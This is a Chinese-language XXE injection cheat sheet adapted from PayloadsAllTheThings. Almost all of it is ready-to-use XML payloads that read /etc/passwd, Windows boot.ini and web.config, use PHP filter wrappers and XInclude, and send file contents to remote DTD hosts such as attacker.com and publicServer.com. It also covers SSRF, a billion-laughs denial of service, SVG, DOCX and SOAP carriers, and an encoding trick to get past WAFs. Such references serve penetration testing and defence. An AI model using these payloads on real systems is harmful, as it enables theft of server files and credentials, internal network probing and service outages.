# XXE Injection - XML外部实体注入

[SEARCH_KEYWORDS]
漏洞类型: XXE XML External Entity XML外部实体注入
攻击类型: File Read SSRF DoS Blind OOB Error Based
关键词: DOCTYPE ENTITY SYSTEM PUBLIC file:// http:// php:// filter
文件类型: XML SVG SOAP DOCX XLSX DTD
技术: Classic XInclude Billion Laugh Error Based Blind

[CONTENT]

## XXE 漏洞概述

XML外部实体攻击是一种针对解析XML输入的应用程序的攻击，允许XML实体告诉XML解析器获取服务器上的特定内容。

## 实体类型

### 内部实体
```xml
<!ENTITY entity_name "entity_value">
```

### 外部实体
```xml
<!ENTITY entity_name SYSTEM "entity_value">
<!ENTITY entity_name PUBLIC "public_id" "system_id">
```

## 经典XXE攻击

### 文件读取

```xml
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>
<root>&test;</root>
```

### Windows文件读取
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
<foo>&xxe;</foo>
```

### PHP Wrapper
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
<contacts><name>&xxe;</name></contacts>
```

### XInclude攻击 (无法修改DOCTYPE时)
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```

## SSRF攻击

通过XXE发起SSRF：

```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
<!ENTITY % xxe SYSTEM "http://internal.service/secret.txt">
]>
<foo>&xxe;</foo>
```

## Error Based XXE

### 使用远程DTD

Payload:
```xml
<?xml version="1.0"?>
<!DOCTYPE message [
<!ENTITY % ext SYSTEM "http://attacker.com/ext.dtd">
%ext;
]>
<message></message>
```

ext.dtd内容:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%error;
```

### 使用本地DTD (Linux)

```xml
<!DOCTYPE message [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd">
<!ENTITY % constant 'aaa)>
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///patt/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
<!ELEMENT aa (bb'>
%local_dtd;
]>
<message>Text</message>
```

### Windows本地DTD

```xml
<!DOCTYPE doc [
<!ENTITY % local_dtd SYSTEM "file:///C:\Windows\System32\wbem\xml\cim20.dtd">
<!ENTITY % SuperClass '>
<!ENTITY &#x25; file SYSTEM "file://D:\webserv2\services\web.config">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file://t/#&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
<!ENTITY test "test"'
>
%local_dtd;
]>
<xxx>anything</xxx>
```

## Blind XXE

### OOB外带数据

```xml
<?xml version="1.0"?>
<!DOCTYPE data SYSTEM "http://publicServer.com/parameterEntity_oob.dtd">
<data>&send;</data>
```

DTD文件:
```xml
<!ENTITY % file SYSTEM "file:///sys/power/image_size">
<!ENTITY % all "<!ENTITY send SYSTEM 'http://publicServer.com/?%file;'>">
%all;
```

### PHP Filter + DTD

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
<!ENTITY % sp SYSTEM "http://127.0.0.1/dtd.xml">
%sp;
%param1;
]>
<r>&exfil;</r>
```

DTD:
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % param1 "<!ENTITY exfil SYSTEM 'http://127.0.0.1/dtd.xml?%data;'>">
```

## DoS攻击

### Billion Laugh攻击

```xml
<!DOCTYPE data [
<!ENTITY a0 "dos">
<!ENTITY a1 "&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;&a0;">
<!ENTITY a2 "&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;&a1;">
<!ENTITY a3 "&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;&a2;">
<!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
]>
<data>&a4;</data>
```

## 特殊文件中的XXE

### SVG文件
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg">
<text font-size="16" x="0" y="16">&xxe;</text>
</svg>
```

### DOCX/XLSX文件
修改 `[Content_Types].xml` 或 `xl/workbook.xml`：
```xml
<!DOCTYPE cdl [<!ELEMENT t ANY><!ENTITY % asd SYSTEM "http://x.x.x.x:8000/xxe.dtd">%asd;%c;]>
<cdl>&rrr;</cdl>
```

### SOAP消息
```xml
<soap:Body>
<foo>
<![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]>
</foo>
</soap:Body>
```

## WAF绕过

### 字符编码绕过
```bash
cat utf8exploit.xml | iconv -f UTF-8 -t UTF-16BE > utf16exploit.xml
```

### JSON端点XXE
修改 Content-Type 从 application/json 为 application/xml：
```xml
<?xml version="1.0" encoding="UTF-8"?>
<root><search>name</search><value>data</value></root>
```

## 工具

- XXEinjector - 自动XXE利用工具
- xxeftp - 支持FTP的XXE服务器
- oxml_xxe - 将XXE嵌入DOCX/XLSX等文件

## 参考文档

原始来源: PayloadsAllTheThings/XXE Injection/README.md